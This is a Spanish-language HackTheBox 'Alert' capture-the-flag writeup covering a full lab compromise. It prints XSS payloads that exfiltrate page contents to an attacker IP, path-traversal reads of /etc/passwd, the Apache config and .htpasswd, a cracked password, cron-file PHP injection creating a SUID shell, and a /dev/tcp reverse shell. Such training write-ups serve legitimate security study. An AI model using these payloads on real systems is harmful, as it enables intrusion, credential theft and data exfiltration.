---
layout: post
render_with_liquid: false
title: "HTB Writeup: Alert"
date: 2026-03-09
category: writeups
tags: [htb, linux, easy, xss, lfi, subdomain-enumeration, hash-cracking, apache]
platform: HackTheBox
os: Linux
difficulty: Easy
has_exploits: false
resumen: "XSS en visualizador Markdown encadenado con LFI para exfiltrar el .htpasswd de Apache. Hash $apr1$ crackeado con hashcat. Acceso SSH por reutilización de credenciales. Escalada mediante inyección en fichero PHP ejecutado por CRON de root."
permalink: /writeups/alert/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Easy       |
| Autor      | Ghostvyle  |

## Sinopsis

Máquina Linux cuyo camino de explotación gira en torno a una cadena de vulnerabilidades web. El sitio `alert.htb` ofrece un **Markdown Viewer** que renderiza HTML sin sanitizar, lo que permite inyectar JavaScript (**XSS**). Combinando este XSS con el formulario de contacto (el admin lee todos los mensajes), forzamos al administrador a ejecutar nuestro payload y exfiltrar contenido de rutas protegidas. Descubrimos un **LFI** en `messages.php` que nos permite leer ficheros arbitrarios del sistema, incluyendo la configuración de Apache y el fichero `.htpasswd` con el hash del usuario **albert**. Tras crackearlo con `hashcat`, reutilizamos la contraseña para acceder por **SSH**. La escalada se consigue inyectando código PHP en un fichero incluido por un **CRON de root**, writable por el grupo `management` al que pertenece `albert`.

---

## Reconocimiento

### Escaneo de puertos

Comenzamos con un escaneo completo de todos los puertos TCP de la máquina víctima:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG allPorts
```

| Parámetro         | Descripción                                              |
| :---------------- | :------------------------------------------------------- |
| `-p-`             | Escanea los 65535 puertos TCP                            |
| `--open`          | Muestra únicamente los puertos abiertos                  |
| `-sS`             | SYN Scan (half-open, más rápido y sigiloso)              |
| `--min-rate 5000` | Envía mínimo 5000 paquetes por segundo                   |
| `-vvv`            | Máxima verbosidad durante el escaneo                     |
| `-n`              | Desactiva la resolución DNS                              |
| `-Pn`             | No realiza descubrimiento de host (asume que está activo)|
| `-oG allPorts`    | Exporta los resultados en formato grepeable              |

![Escaneo de puertos con nmap — descubrimiento de puertos abiertos](/writeups/alert/assets/01_web_homepage.png)

La máquina expone únicamente dos puertos:

- **22/tcp** — SSH
- **80/tcp** — HTTP

### Tecnologías web

Identificamos las tecnologías del sitio con **Wappalyzer**:

![Wappalyzer — Apache 2.4.41 sobre Ubuntu](/writeups/alert/assets/03_web_visualizer.png)

Confirmamos **Apache 2.4.41** y **Ubuntu**. No se detecta ningún CMS ni framework, lo que sugiere una aplicación PHP personalizada.

### Configuración del archivo `/etc/hosts`

El servidor web utiliza Virtual Hosting. Añadimos el dominio al `/etc/hosts`:

```bash
# /etc/hosts
<IP> alert.htb
```

### Exploración de la aplicación web

Accedemos a `http://alert.htb` y nos encontramos con un **Markdown Viewer**:

![Página principal — Markdown Viewer](/writeups/alert/assets/13_web_markdown_upload.png)

La web tiene cuatro secciones: *Markdown Viewer*, *Contact Us*, *About Us* y *Donate*. La funcionalidad principal es subir archivos `.md` y visualizarlos.

La sección principal (`index.php?page=alert`) presenta un formulario de subida con un botón **"View Markdown"**:

![Formulario de subida de archivos Markdown](/writeups/alert/assets/02_web_alert_section.png)

La URL revela que la aplicación usa un parámetro `page` para cargar las diferentes secciones (`index.php?page=alert`, `index.php?page=contact`, etc.).

Subimos un archivo de prueba (`test.md`) para ver cómo lo procesa. Capturamos la petición en **Burp Suite**:

![Burp Suite — POST /visualizer.php subiendo test.md](/writeups/alert/assets/05_web_contact_page.png)

La petición es un `POST /visualizer.php` con `Content-Type: multipart/form-data`. El archivo se envía con `name="file"` y `filename="test.md"`.

El resultado se muestra en `visualizer.php`:

![visualizer.php — Markdown renderizado con botón Share Markdown](/writeups/alert/assets/14_web_visualizer_render.png)

El Markdown se renderiza correctamente. Aparece un botón **"Share Markdown"** que genera un enlace compartible — cualquier archivo que subamos tendrá una URL pública que otros usuarios pueden visitar.

Probamos a incluir HTML dentro del Markdown:

![visualizer.php — HTML renderizado dentro del Markdown](/writeups/alert/assets/06_web_about_page.png)

La URL muestra `visualizer.php?link_share=69aab1d4887f70.58715401.md`. El contenido incluye el heading Markdown y la etiqueta `<marquee>Hola</marquee>` que se ha renderizado como HTML. El visualizador **no sanitiza el HTML** incrustado en el Markdown.

Exploramos la página **About Us**:

![About Us — el admin revisa los mensajes de contacto](/writeups/alert/assets/04_web_index_sections.png)

> *"Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours."*

El administrador **lee activamente los mensajes** enviados por el formulario de contacto. Si le enviamos un enlace malicioso, lo abrirá.

![Contact Us — formulario con email y message](/writeups/alert/assets/19_contact_admin_reads.png)

El formulario de contacto acepta un **email** y un **mensaje** de texto libre.

### Fuzzing de directorios

Lanzamos **gobuster** y **wfuzz** para descubrir rutas ocultas:

```bash
gobuster dir -u http://alert.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![gobuster — fuzzing de directorios](/writeups/alert/assets/07_web_donate_page.png)

Complementamos con **wfuzz** para mayor control sobre los filtros:

```bash
wfuzz -c --hc=404,302 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://alert.htb/FUZZ
```

![wfuzz — resultados del fuzzing de directorios](/writeups/alert/assets/09_wfuzz_dirs_running.png)

| Ruta             | Código | Observación                                        |
| :--------------- | :----- | :------------------------------------------------- |
| `/contact`       | 200    | Formulario de contacto — el admin lee los mensajes |
| `/uploads`       | 403    | Directorio protegido                               |
| `/messages`      | 403    | Directorio protegido                               |
| `/server-status` | 403    | Endpoint estándar de Apache                        |

Las rutas `/uploads` y `/messages` devuelven **403**: existen pero solo son accesibles para usuarios autenticados.

Lanzamos también fuzzing de ficheros PHP:

```bash
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://alert.htb/FUZZ.php
```

<!-- TODO: Falta captura de pantalla de los resultados del fuzzing PHP -->

Los resultados confirman los ficheros PHP que ya habíamos identificado durante la exploración manual:

| Ruta               | Código | Observación                               |
| :----------------- | :----- | :---------------------------------------- |
| `index.php`        | 200    | Página principal con parámetro `page`     |
| `visualizer.php`   | 200    | Renderizador de Markdown                  |
| `contact.php`      | 200    | Procesamiento del formulario de contacto  |
| `messages.php`     | 403    | Protegido — carga ficheros del disco      |

### Fuzzing de subdominios

Enumeramos subdominios virtuales de `alert.htb`:

```bash
wfuzz -c --hc=403,301 -t 20 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.alert.htb" alert.htb
```

![wfuzz — subdominio statistics descubierto](/writeups/alert/assets/10_wfuzz_subdomains_running.png)

Encontramos el subdominio **`statistics.alert.htb`**. Lo añadimos al `/etc/hosts`:

```bash
# /etc/hosts
<IP> alert.htb statistics.alert.htb
```

Al acceder, nos presenta un diálogo de **HTTP Basic Authentication**:

![statistics.alert.htb — autenticación HTTP Basic](/writeups/alert/assets/11_wfuzz_subdomains_results.png)

El subdominio está protegido. No tenemos credenciales por ahora.

---

## Explotación

### XSS en el visualizador Markdown

Durante el reconocimiento comprobamos que el visualizador renderiza HTML sin sanitizar. Subimos un archivo Markdown con contenido HTML para confirmarlo de forma controlada:

![Burp Suite — HTML renderizado en el visualizador](/writeups/alert/assets/17_xss_test_payload.png)

En **Burp Suite** vemos la petición `POST /visualizer.php` con el archivo `messages.md`. El contenido incluye un heading Markdown y una etiqueta `<h1>Hola</h1>`. En la respuesta renderizada, ambos se muestran correctamente. Si HTML se renderiza, **JavaScript también se ejecutará**. El visualizador es vulnerable a **Stored XSS**.

### Encadenamiento XSS + Admin Bot

Combinamos tres elementos:

1. **XSS** en el visualizador — ejecutamos JavaScript en el navegador de quien visite nuestra URL
2. **Enlace compartible** (`link_share`) — la URL es pública
3. **Admin Bot** — el admin lee los mensajes del formulario de contacto

El plan: subimos un archivo con un payload XSS, obtenemos la URL compartible, se la enviamos al admin por el formulario de contacto. Cuando la abra, nuestro JavaScript se ejecutará en **su sesión autenticada** y nos exfiltrará el contenido de las rutas protegidas.

Apuntamos a `messages.php`, que devolvía 403 para nosotros:

```javascript
<script>
    var req = new XMLHttpRequest();
    req.open('GET', 'http://alert.htb/messages.php', false);
    req.send();
    var req2 = new XMLHttpRequest();
    req2.open('GET', 'http://10.10.14.84:7777/?content=' + btoa(req.responseText), true);
    req2.send();
</script>
```

> **Nota:** La primera petición es **síncrona** (`false`) para esperar la respuesta antes de enviarla. `btoa()` codifica en Base64 para evitar que caracteres especiales rompan la URL. Como el JavaScript se ejecuta en el navegador del admin, la petición incluye automáticamente sus cookies de sesión.

Subimos el payload al visualizador:

![Burp Suite — subida del payload XSS](/writeups/alert/assets/15_xss_payload_file.png)

Levantamos un servidor HTTP en nuestra máquina y enviamos la URL compartible al admin por el formulario de contacto:

```bash
python3 -m http.server 7777
```

![Burp Suite — envío de la URL maliciosa al admin por el formulario de contacto](/writeups/alert/assets/20_xss_contact_submission.png)

En **Burp Suite** vemos el `POST /contact.php` con el email y la URL del visualizador como mensaje. El servidor responde con `302 Found` y `Message sent successfully!`.

Recibimos la exfiltración:

![Servidor HTTP recibiendo datos exfiltrados en Base64](/writeups/alert/assets/16_xss_response_received.png)

En la terminal izquierda vemos la petición con el parámetro `content` en Base64. En la derecha decodificamos y obtenemos el HTML de `messages.php`:

```html
<h1>Messages</h1>
<a href='?file=2024-03-10_15-48-34.txt'>...
```

`messages.php` carga ficheros del disco mediante un **parámetro `file`**. Esto es un **Local File Inclusion (LFI)**.

> **Nota:** También exfiltramos el contenido de `uploads.php`, pero no contenía información relevante.

### LFI — Lectura de `/etc/passwd`

Modificamos el payload para explotar el LFI con un **path traversal**:

```javascript
<script>
    var req = new XMLHttpRequest();
    req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/passwd', false);
    req.send();
    var req2 = new XMLHttpRequest();
    req2.open('GET', 'http://10.10.14.84:7777/?content=' + btoa(req.responseText), true);
    req2.send();
</script>
```

![Burp Suite — payload LFI para /etc/passwd](/writeups/alert/assets/21_lfi_passwd_payload.png)

Repetimos el proceso: subir, enviar URL al admin, esperar la exfiltración. Al decodificar la respuesta:

![/etc/passwd decodificado — usuarios albert y david](/writeups/alert/assets/23_lfi_passwd_decoded.png)

Obtenemos el contenido completo de `/etc/passwd`. Los usuarios con shell interactiva son:

- **`albert`** — UID 1000
- **`david`** — UID 1001

### LFI — Configuración de Apache

Recordamos que `statistics.alert.htb` usa **HTTP Basic Auth**. Intentamos acceder con los usuarios descubiertos (`albert`, `david`) y diversas combinaciones, pero sin éxito:

![Panel de autenticación de statistics.alert.htb](/writeups/alert/assets/24_statistics_login_panel.png)

La configuración de Apache nos dará la ruta del fichero `.htpasswd`. Leemos `/etc/apache2/sites-available/000-default.conf`:

```javascript
<script>
    var req = new XMLHttpRequest();
    req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf', false);
    req.send();
    var req2 = new XMLHttpRequest();
    req2.open('GET', 'http://10.10.14.84:7777/?content=' + btoa(req.responseText), true);
    req2.send();
</script>
```

![Burp Suite — payload LFI para la configuración de Apache](/writeups/alert/assets/25_lfi_apache_config_payload.png)

Al decodificar la respuesta obtenemos la configuración completa:

![Configuración de Apache — VirtualHosts y AuthUserFile](/writeups/alert/assets/27_lfi_apache_config_htpasswd_path.png)

Vemos dos VirtualHosts definidos. El de `statistics.alert.htb` incluye:

- `DocumentRoot /var/www/statistics.alert.htb`
- `AuthType Basic`
- **`AuthUserFile /var/www/statistics.alert.htb/.htpasswd`**

### LFI — Lectura del `.htpasswd`

Usamos la ruta encontrada para leer el `.htpasswd`:

![Burp Suite — payload LFI para .htpasswd](/writeups/alert/assets/28_lfi_htpasswd_payload.png)

![.htpasswd exfiltrado — hash de albert](/writeups/alert/assets/29_lfi_htpasswd_content.png)

Decodificamos y obtenemos el hash:

```
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

El prefijo `$apr1$` identifica el algoritmo **Apache MD5**.

### Cracking del hash

Guardamos el hash en un fichero:

![hash.txt con el hash Apache MD5](/writeups/alert/assets/30_hashcat_hash_file.png)

Lanzamos **hashcat** con el modo **1600** (Apache MD5):

```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

| Parámetro      | Descripción                                    |
| :------------- | :--------------------------------------------- |
| `-m 1600`      | Modo Apache MD5 (`$apr1$`)                     |
| `hash.txt`     | Fichero con el hash a crackear                 |
| `rockyou.txt`  | Diccionario de contraseñas más habitual en CTFs|

![hashcat — contraseña crackeada: manchesterunited](/writeups/alert/assets/31_hashcat_cracked.png)

Contraseña obtenida: **`manchesterunited`**

### Acceso al panel `statistics.alert.htb`

Probamos las credenciales `albert:manchesterunited`:

![Alert Dashboard — acceso exitoso](/writeups/alert/assets/32_statistics_login_success.png)

Entramos con éxito al **Alert Dashboard**, que muestra una tabla de donaciones mensuales y un gráfico de barras.

Comprobamos las tecnologías con **Wappalyzer**:

![Wappalyzer en statistics.alert.htb — Apache 2.4.41, PHP, Ubuntu](/writeups/alert/assets/26_lfi_apache_config_content.png)

A diferencia de `alert.htb`, aquí Wappalyzer detecta también **PHP** como lenguaje de programación.

### Acceso SSH como `albert`

Probamos la misma contraseña para SSH, ya que la reutilización de credenciales es un vector habitual:

```bash
ssh albert@<IP>
# Contraseña: manchesterunited
```

![Acceso SSH como albert](/writeups/alert/assets/33_ssh_access_albert.png)

Estamos dentro de la máquina como `albert`.

---

## Escalada de privilegios

Con acceso como `albert`, enumeramos el sistema en busca de vectores de escalada.

### Monitorización de procesos con pspy

Los métodos habituales (`sudo -l`, SUID, capabilities) no devuelven resultados útiles. Transferimos **pspy64** a la máquina víctima para monitorizar procesos:

![Descarga de pspy64 y servidor HTTP para transferencia](/writeups/alert/assets/34_privesc_enum_01.png)

Descargamos `pspy64` desde GitHub y levantamos un servidor HTTP con `python3 -m http.server 8080`.

![Descarga de pspy64 en la máquina víctima con wget](/writeups/alert/assets/35_privesc_enum_02.png)

En la máquina víctima descargamos y ejecutamos `pspy`:

```bash
wget http://10.10.14.84:8080/pspy64
chmod +x pspy64
./pspy64
```

![Descarga completada y preparación de pspy64](/writeups/alert/assets/36_privesc_enum_03.png)

### Descubrimiento del CRON

Ejecutamos `pspy` y comenzamos a monitorizar los procesos del sistema:

![pspy en ejecución — monitorizando procesos del sistema](/writeups/alert/assets/37_privesc_vector.png)

Tras unos segundos, `pspy` captura un proceso ejecutado periódicamente por **UID=0 (root)**:

![pspy — CRON de root ejecutando monitor.php](/writeups/alert/assets/38_privesc_analysis.png)

```
CMD: UID=0  /usr/bin/php -f /opt/website-monitor/monitor.php
```

**Root** ejecuta periódicamente `/opt/website-monitor/monitor.php`. Si podemos modificar este script o algo que incluya, obtendremos ejecución como root.

### Análisis de la aplicación

Navegamos a `/opt/website-monitor/` y leemos `monitor.php`:

![Contenido de /opt/website-monitor/ y monitor.php](/writeups/alert/assets/39_privesc_exploit_prep.png)

```php
include('config/configuration.php');
$monitors = json_decode(file_get_contents(PATH.'/monitors.json'));
```

El script **incluye `config/configuration.php`** al inicio. Comprobamos los permisos:

![Permisos de configuration.php — writable por grupo management](/writeups/alert/assets/40_privesc_exploit_exec.png)

Ejecutamos `ls -la config/`, `id` y `cat config/configuration.php`:

1. `configuration.php` tiene permisos `-rwxrwxr-x` y pertenece a **root:management**
2. `albert` pertenece al grupo `management` (`groups=1000(albert),1001(management)`)
3. El contenido actual solo define una constante `PATH`

La cadena queda clara: `configuration.php` es **writable por nuestro grupo**, y root lo ejecuta periódicamente vía CRON.

### Inyección de código PHP

Editamos `configuration.php` para inyectar una copia de `/bin/bash` con **SUID**:

```php
<?php
system('cp /bin/bash /tmp/mibash; chmod +s /tmp/mibash');
?>
```

![Edición de configuration.php — bash SUID](/writeups/alert/assets/43_root_flag.png)

> También podríamos usar una **reverse shell**:
> ```php
> <?php
> system('bash -c "bash -i >& /dev/tcp/10.10.14.84/4444 0>&1"');
> ?>
> ```

![Alternativa — reverse shell en configuration.php](/writeups/alert/assets/41_privesc_verify.png)

En esta captura vemos el editor `nano` con el payload de reverse shell y a la derecha un listener de **netcat** esperando la conexión.

### Acceso como root

Esperamos a que el CRON ejecute `monitor.php` con nuestro código inyectado:

![Bash SUID creada en /tmp](/writeups/alert/assets/42_root_access.png)

Confirmamos que `mibash` existe en `/tmp` con permisos SUID. Ejecutamos:

```bash
/tmp/mibash -p
```

Somos **root** en la máquina Alert.

---

## Resumen del ataque

```
Reconocimiento (nmap) → Puertos 22 y 80
    ↓
Exploración web → Markdown Viewer, visualizer.php renderiza HTML sin sanitizar
    → About Us: "admin reviews contact messages"
    ↓
Fuzzing (wfuzz/gobuster) → /uploads (403), /messages (403)
Fuzzing subdominios → statistics.alert.htb [HTTP Basic Auth]
    ↓
XSS + link_share + Admin Bot (contact form)
    → Exfiltración de messages.php → LFI (?file=)
    ↓
LFI → /etc/passwd → Usuarios: albert, david
LFI → Apache config → AuthUserFile .htpasswd
LFI → .htpasswd → albert:$apr1$...
    ↓
hashcat -m 1600 → manchesterunited
    ↓
SSH albert@alert (reutilización de credenciales) ✓
    ↓
pspy → CRON de root ejecuta monitor.php
    → configuration.php writable por grupo management (albert)
    → Inyección PHP → bash SUID → root ✓
```

---


